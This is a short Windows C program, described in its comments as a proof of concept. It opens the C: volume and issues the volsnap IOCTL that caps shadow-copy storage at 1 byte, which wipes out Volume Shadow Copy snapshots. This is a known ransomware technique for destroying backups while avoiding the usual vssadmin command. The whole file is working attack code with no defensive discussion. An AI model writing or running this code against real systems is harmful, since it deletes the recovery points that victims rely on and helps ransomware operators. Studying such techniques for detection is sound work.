#include <Windows.h>
#include <tchar.h>


typedef struct _DIFF_AREA_SIZES
{
	LONGLONG UsedSpace; //value used for querying only
	LONGLONG AllocatedSpace; //value used for querying only
	LONGLONG MaximumSpace; //0 means UNBOUNDED
} DIFF_AREA_SIZES, *PDIFF_AREA_SIZES;

#define IOCTL_VOLSNAP_SET_MAX_DIFF_AREA_SIZE 0x53c028 //type=0x53, function=0xc, method=METHOD_BUFFERED, Access=(FILE_READ_ACCESS | FILE_WRITE_ACCESS)

DWORD dwBRet;
DIFF_AREA_SIZES diffAreaSize;
TCHAR* tszVolumePath = _T("\\\\.\\C:"); //hardcoded, but perfectly enough for a PoC
HANDLE hVolume;

int _tmain(int argc, _TCHAR** argv)
{
	diffAreaSize.UsedSpace = 0; //unused anyway
	diffAreaSize.AllocatedSpace = 0; //unused anyway
	diffAreaSize.MaximumSpace = 1; //set to 1 byte of snapshot storage

	_tprintf(_T("Calling CreateFile()...\r\n"));

	hVolume = CreateFile(
		tszVolumePath,
		FILE_GENERIC_READ | FILE_GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	_tprintf(TEXT("CreateFile() returned %i\r\n"), GetLastError());
	if (INVALID_HANDLE_VALUE == hVolume)
	{
		return GetLastError();
	}

	_tprintf(_T("Calling DeviceIoControl()...\r\n"));

	DeviceIoControl(
		hVolume,
		IOCTL_VOLSNAP_SET_MAX_DIFF_AREA_SIZE,
		&diffAreaSize,
		sizeof(diffAreaSize),
		NULL,
		0,
		&dwBRet,
		NULL
	);
	_tprintf(_T("DeviceIoControl() returned %i\r\n"), GetLastError());
	CloseHandle(hVolume);
	return GetLastError();
}
